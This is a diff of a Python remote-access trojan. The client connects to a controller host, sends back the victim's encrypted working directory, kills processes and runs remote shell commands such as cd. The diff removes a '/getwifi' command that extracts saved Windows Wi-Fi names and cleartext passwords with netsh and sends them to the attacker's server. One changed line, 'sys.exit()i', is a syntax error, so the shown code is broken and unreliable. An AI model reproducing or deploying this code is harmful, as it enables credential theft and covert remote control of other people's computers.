@@ -37,7 +37,7 @@ s = socket.socket()
 try:
     s.connect((SERVER_HOST, SERVER_PORT))
 except socket.error as e:
-    sys.exit()
+    sys.exit()i
 cwd = os.getcwd()
 cwd = Fernet(key).encrypt(cwd.encode())
 s.send(cwd)
@@ -120,37 +120,6 @@ while True:
         subprocess.Popen("cmd /k taskkill /im live.exe /f")
         sender_port = 422
         continue
-    if command == "/getwifi":
-        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], shell = True, capture_output = True).stdout.decode()
-        profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
-
-        wifi_list = []
-        wifi_list_profiles = str()
-    
-        if len(profile_names) != 0:
-            for name in profile_names:
-                wifi_profile = {}
-                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], shell = True, capture_output = True).stdout.decode()
-                if re.search("Security key           : Absent", profile_info):
-                    continue
-                else:
-                    wifi_profile["ssid"] = name
-                    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], shell = True, capture_output = True).stdout.decode()
-                    password = re.search("Key Content            : (.*)\r", profile_info_pass)
-                    if password == None:
-                        wifi_profile["password"] = None
-                    else:
-                        wifi_profile["password"] = password[1]
-                    wifi_list.append(wifi_profile) 
-        if wifi_list == []:
-            wifi_notfound = Fernet(key).encrypt((f"[{IMPORTANT}] no wifi profiles found{END}").encode())
-            s.send(wifi_notfound)  
-        if wifi_list != []:
-            for x in range(len(wifi_list)):
-                wifi_list_new = f"[{INFO}] {wifi_list[x]}\n"
-                wifi_list_profiles = wifi_list_profiles + wifi_list_new
-            wifi_tosend = Fernet(key).encrypt(wifi_list_profiles.encode())
-            s.send(wifi_tosend)
     if splited_command[0].lower() == "cd":
         try:
             os.chdir(' '.join(splited_command[1:]))
